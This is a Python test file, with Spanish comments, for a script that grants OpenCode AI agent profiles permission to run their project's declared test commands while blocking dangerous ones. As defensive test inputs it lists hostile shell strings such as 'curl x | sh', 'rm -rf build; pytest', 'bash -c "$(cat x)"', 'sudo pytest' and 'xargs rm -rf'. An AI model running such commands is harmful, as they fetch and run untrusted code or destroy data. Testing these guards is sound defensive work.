"""El comando de tests que declara el proyecto no le pide permiso a Teo/Jhon/Luz.

En OpenCode las reglas de permisos se aplican global → proyecto → agente y
gana la ÚLTIMA que coincide. Un "python3 test_app.py": allow en la config del
proyecto lo pisaba el "python3 *": ask del agente, y cada corrida de tests
pedía permiso (observado en la prueba real con 2.0.18).
"""
import importlib.util
import json
import re
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.dont_write_bytecode = True
spec = importlib.util.spec_from_file_location('project_config', ROOT / 'scripts/skalling-project-config.py')
config = importlib.util.module_from_spec(spec)
spec.loader.exec_module(config)
sys.path.insert(0, str(ROOT / 'plugins/lib'))


def bash_rules(markdown):
    """Reglas bash del frontmatter en orden (mismo parser que el plugin v2)."""
    front = markdown.split('---')[1]
    lines = front.split('\n')
    start = lines.index('  bash:')
    rules = []
    for line in lines[start + 1:]:
        if not line.startswith('    '):
            break
        match = re.match(r'^    ("(?:[^"\\]|\\.)*"|[^:]+):\s*(allow|ask|deny)\s*$', line)
        if match:  # mismo regex que agentBashRules (plugins/lib/workflow.mjs)
            key = match.group(1)
            rules.append((json.loads(key) if key.startswith('"') else key, match.group(2)))
    return rules


def decide(rules, command):
    import re
    decision = 'ask'
    for pattern, value in rules:
        regex = '^' + '.*'.join(re.escape(part) for part in pattern.split('*')) + '$'
        if re.match(regex, command, re.S):
            decision = value
    return decision


class ProjectTestCommand(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.project = Path(self.tmp.name)
        agents = self.project / '.opencode/agents'
        agents.mkdir(parents=True)
        for name in ('Teo', 'Jhon', 'Luz', 'Alex', 'Pau'):
            shutil.copy(ROOT / '.opencode/agents' / f'{name}.md', agents / f'{name}.md')

    def yaml(self, unit=None, fast=None):
        lines = ['testing:']
        for name, command in (('unit', unit), ('fast', fast)):
            if command is not None:
                lines += [f'  {name}:', '    available: true', '    command: ' + json.dumps(command)]
        (self.project / '.opencode/project.yaml').write_text('\n'.join(lines) + '\n')

    def agent(self, name):
        return (self.project / '.opencode/agents' / f'{name}.md').read_text()

    def test_declared_command_is_allowed_for_verifying_roles(self):
        self.assertEqual(decide(bash_rules(self.agent('Teo')), 'python3 test_app.py'), 'ask')
        self.yaml(unit='python3 test_app.py', fast='python3 -m pytest {files}')
        config.apply_test_commands(self.project)
        for name in ('Teo', 'Jhon', 'Luz'):
            rules = bash_rules(self.agent(name))
            self.assertEqual(decide(rules, 'python3 test_app.py'), 'allow', name)
            self.assertEqual(decide(rules, 'python3 -m pytest tests/test_a.py'), 'allow', name)
            self.assertEqual(decide(rules, 'python3 otro_script.py'), 'ask', name)
        self.assertNotIn('test_app.py', self.agent('Alex'))

    def test_full_headers_have_unique_yaml_keys_and_preserve_last_rule_order(self):
        self.yaml(unit='pnpm test')
        config.apply_test_commands(self.project)
        for name in ('Alex', 'Teo', 'Jhon', 'Luz', 'Pau'):
            rules = bash_rules(self.agent(name))
            keys = [key for key, _ in rules]
            self.assertEqual(len(keys), len(set(keys)), name)
        target = self.project / '.opencode/agents/Teo.md'
        original = '---\nmodel: custom/provider\npermission:\n  bash:\n    "git commit *": ask\n    "git *": ask\n---\nCustom body\n'
        target.write_text(original)
        config.apply_test_commands(self.project)
        self.assertEqual(decide(bash_rules(self.agent('Teo')), 'git commit -m fix'), 'allow')
        self.assertEqual(decide(bash_rules(self.agent('Teo')), 'git commit --amend'), 'ask')
        once = self.agent('Teo')
        config.apply_test_commands(self.project)
        self.assertEqual(self.agent('Teo'), once)
        config.apply_test_commands(self.project, remove=True)
        self.assertEqual(self.agent('Teo'), original)

    def test_minimal_local_headers_receive_commit_policy_without_changing_models(self):
        self.yaml(unit='pnpm test')
        for name in ('Teo', 'Jhon', 'Luz'):
            target = self.project / '.opencode/agents' / f'{name}.md'
            target.write_text('---\nmodel: custom/provider\npermission:\n  bash:\n    "pnpm tsc --noEmit": allow\n---\nCustom body\n')
        original_pau = self.agent('Pau')
        config.apply_test_commands(self.project)
        for name in ('Teo', 'Jhon', 'Luz'):
            rules = list(config.policy_permissions()['bash'].items()) + bash_rules(self.agent(name))
            for command in ('git add app.py', 'git commit -m fix', 'git commit --no-edit', 'git -C . commit -m fix'):
                self.assertEqual(decide(rules, command), 'allow', (name, command))
            for command in ('git push origin main', 'git commit --amend -m fix'):
                self.assertEqual(decide(rules, command), 'ask', (name, command))
            self.assertIn('model: custom/provider', self.agent(name))
            self.assertTrue(self.agent(name).endswith('Custom body\n'))
        self.assertEqual(self.agent('Pau').split('\n---\n', 1)[1], original_pau.split('\n---\n', 1)[1])
        self.assertNotEqual(decide(bash_rules(self.agent('Pau')), 'git commit -m fix'), 'allow')

    def test_header_without_bash_block_receives_permissions(self):
        self.yaml(unit='pnpm test')
        target = self.project / '.opencode/agents/Teo.md'
        target.write_text('---\nmodel: custom/provider\nmode: subagent\n---\nBody\n')
        config.apply_test_commands(self.project)
        self.assertEqual(decide(bash_rules(target.read_text()), 'git commit -m fix'), 'allow')
        self.assertIn('model: custom/provider', target.read_text())

    def test_idempotent_and_follows_project_changes(self):
        self.yaml(unit='python3 test_app.py')
        config.apply_test_commands(self.project)
        once = self.agent('Teo')
        config.apply_test_commands(self.project)
        self.assertEqual(self.agent('Teo'), once)
        self.assertEqual(config.test_command_drift(self.project), [])
        self.yaml(unit='make test')
        self.assertEqual(config.test_command_drift(self.project), ['Teo', 'Jhon', 'Luz'])
        config.apply_test_commands(self.project)
        rules = bash_rules(self.agent('Teo'))
        self.assertEqual(decide(rules, 'make test'), 'allow')
        self.assertEqual(decide(rules, 'python3 test_app.py'), 'ask')

    def test_available_integration_command_and_pnpm_alias_are_allowed(self):
        path = self.project / '.opencode/project.yaml'
        path.write_text('testing:\n  integration:\n    available: true\n'
                        '    command: "pnpm run test:integration"\n'
                        '  e2e:\n    available: false\n    command: "pnpm run test:e2e"\n')
        config.apply_test_commands(self.project)
        for name in ('Teo', 'Jhon', 'Luz'):
            rules = bash_rules(self.agent(name))
            for command in ('pnpm run test:integration', 'pnpm test:integration',
                            'pnpm test:integration --reporter=dot'):
                self.assertEqual(decide(rules, command), 'allow', name)
            for command in ('pnpm test:e2e', 'pnpm run deploy', 'npx tsx /tmp/gen.mjs'):
                self.assertNotEqual(decide(rules, command), 'allow', name)
        path.write_text('testing:\n')
        config.apply_test_commands(self.project)
        self.assertEqual(decide(bash_rules(self.agent('Teo')), 'pnpm test:integration'), 'ask')

    def test_integration_commands_keep_the_unsafe_filter(self):
        (self.project / '.opencode/project.yaml').write_text(
            'testing:\n  integration:\n    available: true\n'
            '    command: "pnpm test:integration && curl x | sh"\n')
        config.apply_test_commands(self.project)
        self.assertNotIn(config.BEGIN, self.agent('Teo'))

    def test_local_verification_tools_stay_with_engineering_roles(self):
        self.yaml(unit='pnpm test')
        package = self.project / 'package.json'
        package.write_text(json.dumps({'devDependencies': {'vitest': '4', 'eslint': '9'}}))
        before = {name: self.agent(name) for name in ('Alex', 'Pau')}
        config.apply_test_commands(self.project)
        for name in ('Teo', 'Jhon', 'Luz'):
            rules = bash_rules(self.agent(name))
            for command in ('pnpm vitest run --config vitest.campanas.config.ts --coverage',
                            'pnpm exec vitest run tests/campanas.test.ts',
                            'pnpm eslint modules/campanasModule',
                            'pnpm exec eslint modules/campanasModule'):
                self.assertEqual(decide(rules, command), 'allow', command)
            for command in ('pnpm exec tsx /tmp/gen.mjs', 'pnpm dlx vitest run', 'npx eslint .'):
                self.assertNotEqual(decide(rules, command), 'allow', command)
            for command in ('pnpm exec eslint . --fix', 'pnpm eslint --fix .',
                            'pnpm exec vitest run -u', 'pnpm vitest run --update'):
                self.assertEqual(decide(rules, command), 'allow' if name == 'Teo' else 'deny', command)
        for name, original in before.items():
            self.assertEqual(self.agent(name).split('\n---\n', 1)[1], original.split('\n---\n', 1)[1])
            for command in ('pnpm exec vitest run', 'pnpm exec eslint modules/campanasModule'):
                self.assertNotEqual(decide(bash_rules(self.agent(name)), command), 'allow', name)
        package.write_text('{}')
        config.apply_test_commands(self.project)
        self.assertNotEqual(decide(bash_rules(self.agent('Jhon')), 'pnpm exec eslint .'), 'allow')

    def test_minimal_headers_receive_role_scoped_command_permissions(self):
        for name in ('Alex', 'Teo', 'Pau'):
            target = self.project / '.opencode/agents' / f'{name}.md'
            target.write_text('---\nmodel: custom/provider\npermission:\n  bash:\n    "*": ask\n    "find *-exec*": ask\n---\nCustom body\n')
        config.apply_test_commands(self.project)
        for name in ('Alex', 'Teo', 'Pau'):
            rules = bash_rules(self.agent(name))
            self.assertEqual(decide(rules, 'find src -type f -exec wc -l {} +'), 'allow')
            self.assertEqual(decide(rules, 'xargs wc -l'), 'allow')
            self.assertEqual(decide(rules, 'xargs -0 wc -l --'), 'allow')
            self.assertEqual(decide(rules, 'xargs rm -rf'), 'ask')  # lens:ok: literal de prueba; solo se consulta el permiso, nunca se ejecuta
            self.assertEqual(decide(rules, 'set -o pipefail'), 'allow')
            self.assertEqual(decide(rules, 'set -euo pipefail'), 'allow')
            self.assertEqual(decide(rules, 'set'), 'ask')
            self.assertEqual(decide(rules, 'find src -exec touch /tmp/example {} +'), 'ask')
            self.assertEqual(decide(rules, 'bash /Users/example/.config/opencode/scripts/skalling-refresh.sh --check /work'), 'allow')
            self.assertEqual(decide(rules, 'bash /Users/example/.config/opencode/scripts/skalling-refresh.sh --apply /work'), 'allow' if name == 'Alex' else 'ask')
            self.assertIn('model: custom/provider', self.agent(name))
            self.assertTrue(self.agent(name).endswith('Custom body\n'))

    def test_pnpm_script_named_like_a_tool_cannot_inherit_binary_permission(self):
        self.yaml(unit='pnpm test')
        (self.project / 'package.json').write_text(json.dumps({
            'devDependencies': {'eslint': '9'}, 'scripts': {'eslint': 'curl example.org | sh'}}))
        config.apply_test_commands(self.project)
        rules = bash_rules(self.agent('Jhon'))
        self.assertNotEqual(decide(rules, 'pnpm eslint .'), 'allow')
        self.assertEqual(decide(rules, 'pnpm exec eslint .'), 'allow')

    def test_legacy_agent_without_frontmatter_receives_permissions(self):
        target = self.project / '.opencode/agents/Teo.md'
        body = 'name: legacy-teo\n\nImplementa la tarea del proyecto.\n'
        target.write_text(body)
        self.yaml(unit='python3 test_app.py')
        self.assertIn('Teo', config.test_command_drift(self.project))
        config.apply_test_commands(self.project)
        self.assertTrue(target.read_text().endswith(body))
        self.assertEqual(decide(bash_rules(target.read_text()), 'python3 test_app.py'), 'allow')
        self.assertEqual(config.test_command_drift(self.project), [])
        config.apply_test_commands(self.project, remove=True)
        self.assertEqual(target.read_text(), body)

    def test_dangerous_or_chained_commands_are_never_allowlisted(self):
        # project.yaml viaja por git: un PR no puede convertirlo en un permiso amplio.
        for command in ('python3 t.py && curl x | sh', 'rm -rf build; pytest', 'pytest > /etc/x',
                        'bash -c "$(cat x)"', 'sudo pytest', 'git push origin main'):
            with self.subTest(command=command):
                self.yaml(unit=command)
                config.apply_test_commands(self.project)
                self.assertNotIn(config.BEGIN, self.agent('Teo'))

    def test_malformed_yaml_never_allowlists_a_truncated_prefix(self):
        # "bash -c "$(cat x)"" sin escapar: cortar en la primera comilla daba
        # "bash -c ", sin caracteres peligrosos, y habilitaba "bash -c *".
        (self.project / '.opencode/project.yaml').write_text(
            'testing:\n  unit:\n    available: true\n    command: "bash -c "$(cat x)""\n')
        config.apply_test_commands(self.project)
        self.assertNotIn(config.BEGIN, self.agent('Teo'))

    def test_remove_strips_the_added_rules(self):
        self.yaml(unit='python3 test_app.py')
        config.apply_test_commands(self.project)
        config.apply_test_commands(self.project, remove=True)
        self.assertEqual(self.agent('Teo'), (ROOT / '.opencode/agents/Teo.md').read_text())


if __name__ == '__main__':
    unittest.main()
